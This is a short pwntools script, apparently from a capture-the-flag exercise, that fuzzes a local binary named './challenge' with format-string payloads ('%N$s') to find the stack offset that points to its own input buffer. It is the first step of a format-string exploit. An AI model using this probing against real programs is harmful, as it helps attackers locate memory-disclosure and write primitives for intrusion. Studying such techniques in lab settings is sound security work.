from pwn import *

context.log_level = 'error'

def fuzz():
    for i in range(1, 50):
        try:
            p = process('./challenge')
            p.recvuntil(b'> ')
            p.sendline(b'1')
            p.recvuntil(b'Transmit data: ')

            p.sendline(f'TAG %{i}$s'.encode())
            
            p.recvuntil(b'The archives echo back: ')
            result = p.recvline() 
            if b'TAG TAG ' in result:
                print(f'FOUND POINTER TO BUF AT: {i}')
            p.close()
        except:
            p.close()

fuzz()
